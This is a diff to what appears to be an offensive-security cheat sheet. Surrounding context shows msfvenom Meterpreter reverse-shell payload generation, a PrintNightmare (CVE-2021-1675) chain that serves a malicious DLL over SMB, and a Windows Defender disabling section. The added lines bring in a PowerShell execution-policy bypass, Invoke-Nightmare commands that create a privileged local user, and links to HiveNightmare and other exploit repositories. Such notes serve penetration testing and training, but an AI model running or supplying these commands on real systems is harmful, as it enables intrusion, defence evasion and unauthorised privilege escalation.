@@ -4058,6 +4058,12 @@ $ msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port
 #12. - Evasion
 -----------------------------------------
 
+- Bypass PowerShell Execution Policy
+
+```
+PS C:\> powershell -ExecutionPolicy bypass
+```
+
 - Disable Windows Defender
 
 ```
@@ -4247,6 +4253,9 @@ $ rpcdump.py @<IP address> | egrep 'MS-RPRN|MS-PAR'
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<port> -f dll > backupscript.dll
 $ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 $ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
+https://github.com/calebstewart/CVE-2021-1675
+PS C:\> Import-Module .\CVE-2021-1675.ps1
+PS C:\> Invoke-Nightmare -NewUser "<username>" -NewPassword "<password>!" -DriverName "PrintIt"
 ```
 
 - PetitPotam - CVE-2021-36942
@@ -4353,6 +4362,12 @@ https://github.com/Bonfee/CVE-2022-25636
 
 ```
 https://github.com/Liuk3r/CVE-2023-32233
+```
+
+- HiveNightmare - CVE-2021-36934
+
+```
+https://github.com/GossiTheDog/HiveNightmare/
 ```
 
 #16. - Exploit Research
